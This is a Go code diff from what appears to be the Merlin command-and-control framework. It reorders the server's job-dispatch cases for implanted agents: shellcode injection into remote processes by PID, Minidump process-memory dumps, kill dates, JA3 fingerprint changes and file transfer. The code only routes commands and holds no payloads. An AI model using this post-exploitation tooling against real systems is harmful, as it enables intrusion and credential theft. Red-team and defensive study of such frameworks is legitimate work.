@@ -80,23 +80,6 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 		job.Payload = merlinJob.Command{
 			Command: "agentInfo",
 		}
-	case "shellcode":
-		job.Type = merlinJob.SHELLCODE
-		payload := merlinJob.Shellcode{
-			Method: jobArgs[0],
-		}
-
-		if payload.Method == "self" {
-			payload.Bytes = jobArgs[1]
-		} else if payload.Method == "remote" || payload.Method == "rtlcreateuserthread" || payload.Method == "userapc" {
-			i, err := strconv.Atoi(jobArgs[1])
-			if err != nil {
-				return "", err
-			}
-			payload.PID = uint32(i)
-			payload.Bytes = jobArgs[2]
-		}
-		job.Payload = payload
 	case "download":
 		job.Type = merlinJob.FILETRANSFER
 		agent.Log(fmt.Sprintf("Downloading file from agent at %s\n", jobArgs[0]))
@@ -106,6 +89,25 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 			IsDownload:   false,
 		}
 		job.Payload = p
+	case "cd":
+		job.Type = merlinJob.NATIVE
+		p := merlinJob.Command{
+			Command: "cd",
+			Args:    jobArgs[0:],
+		}
+		job.Payload = p
+	case "CreateProcess":
+		job.Type = merlinJob.MODULE
+		p := merlinJob.Command{
+			Command: jobType,
+			Args:    jobArgs,
+		}
+		job.Payload = p
+	case "ifconfig":
+		job.Type = merlinJob.NATIVE
+		job.Payload = merlinJob.Command{
+			Command: jobType,
+		}
 	case "initialize":
 		job.Type = merlinJob.CONTROL
 		p := merlinJob.Command{
@@ -121,10 +123,29 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 			Command: "clr",
 			Args:    append([]string{jobType}, jobArgs...),
 		}
+	case "ja3":
+		job.Type = merlinJob.CONTROL
+		p := merlinJob.Command{
+			Command: jobArgs[0],
+		}
+
+		if len(jobArgs) == 2 {
+			p.Args = jobArgs[1:]
+		}
+		job.Payload = p
 	case "kill":
 		job.Type = merlinJob.CONTROL
 		p := merlinJob.Command{
 			Command: jobArgs[0], // TODO, this should be in jobType position
+		}
+		job.Payload = p
+	case "killdate":
+		job.Type = merlinJob.CONTROL
+		p := merlinJob.Command{
+			Command: jobArgs[0],
+		}
+		if len(jobArgs) == 2 {
+			p.Args = jobArgs[1:]
 		}
 		job.Payload = p
 	case "list-assemblies":
@@ -178,28 +199,6 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 			p.Args = []string{"./"}
 		}
 		job.Payload = p
-	case "killdate":
-		job.Type = merlinJob.CONTROL
-		p := merlinJob.Command{
-			Command: jobArgs[0],
-		}
-		if len(jobArgs) == 2 {
-			p.Args = jobArgs[1:]
-		}
-		job.Payload = p
-	case "cd":
-		job.Type = merlinJob.NATIVE
-		p := merlinJob.Command{
-			Command: "cd",
-			Args:    jobArgs[0:],
-		}
-		job.Payload = p
-	case "pwd":
-		job.Type = merlinJob.NATIVE
-		p := merlinJob.Command{
-			Command: jobArgs[0], // TODO This should be in the jobType position
-		}
-		job.Payload = p
 	case "maxretry":
 		job.Type = merlinJob.CONTROL
 		p := merlinJob.Command{
@@ -210,12 +209,6 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 			p.Args = jobArgs[1:]
 		}
 		job.Payload = p
-	case "nslookup":
-		job.Type = merlinJob.NATIVE
-		job.Payload = merlinJob.Command{
-			Command: jobType,
-			Args:    jobArgs,
-		}
 	case "memfd":
 		if len(jobArgs) < 1 {
 			return "", fmt.Errorf("expected 1 argument for the memfd command, received %d", len(jobArgs))
@@ -235,6 +228,19 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 			Command: jobType,
 			Args:    append([]string{b}, jobArgs[1:]...),
 		}
+	case "Minidump":
+		job.Type = merlinJob.MODULE
+		p := merlinJob.Command{
+			Command: jobType,
+			Args:    jobArgs,
+		}
+		job.Payload = p
+	case "nslookup":
+		job.Type = merlinJob.NATIVE
+		job.Payload = merlinJob.Command{
+			Command: jobType,
+			Args:    jobArgs,
+		}
 	case "padding":
 		job.Type = merlinJob.CONTROL
 		p := merlinJob.Command{
@@ -243,6 +249,12 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 
 		if len(jobArgs) == 2 {
 			p.Args = jobArgs[1:]
+		}
+		job.Payload = p
+	case "pwd":
+		job.Type = merlinJob.NATIVE
+		p := merlinJob.Command{
+			Command: jobArgs[0], // TODO This should be in the jobType position
 		}
 		job.Payload = p
 	case "run":
@@ -259,6 +271,23 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 		payload := merlinJob.Command{
 			Command: jobType,
 			Args:    jobArgs,
+		}
+		job.Payload = payload
+	case "shellcode":
+		job.Type = merlinJob.SHELLCODE
+		payload := merlinJob.Shellcode{
+			Method: jobArgs[0],
+		}
+
+		if payload.Method == "self" {
+			payload.Bytes = jobArgs[1]
+		} else if payload.Method == "remote" || payload.Method == "rtlcreateuserthread" || payload.Method == "userapc" {
+			i, err := strconv.Atoi(jobArgs[1])
+			if err != nil {
+				return "", err
+			}
+			payload.PID = uint32(i)
+			payload.Bytes = jobArgs[2]
 		}
 		job.Payload = payload
 	case "skew":
@@ -279,30 +308,6 @@ func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
 
 		if len(jobArgs) == 2 {
 			p.Args = jobArgs[1:]
-		}
-		job.Payload = p
-	case "ja3":
-		job.Type = merlinJob.CONTROL
-		p := merlinJob.Command{
-			Command: jobArgs[0],
-		}
-
-		if len(jobArgs) == 2 {
-			p.Args = jobArgs[1:]
-		}
-		job.Payload = p
-	case "Minidump":
-		job.Type = merlinJob.MODULE
-		p := merlinJob.Command{
-			Command: jobType,
-			Args:    jobArgs,
-		}
-		job.Payload = p
-	case "CreateProcess":
-		job.Type = merlinJob.MODULE
-		p := merlinJob.Command{
-			Command: jobType,
-			Args:    jobArgs,
 		}
 		job.Payload = p
 	case "upload":
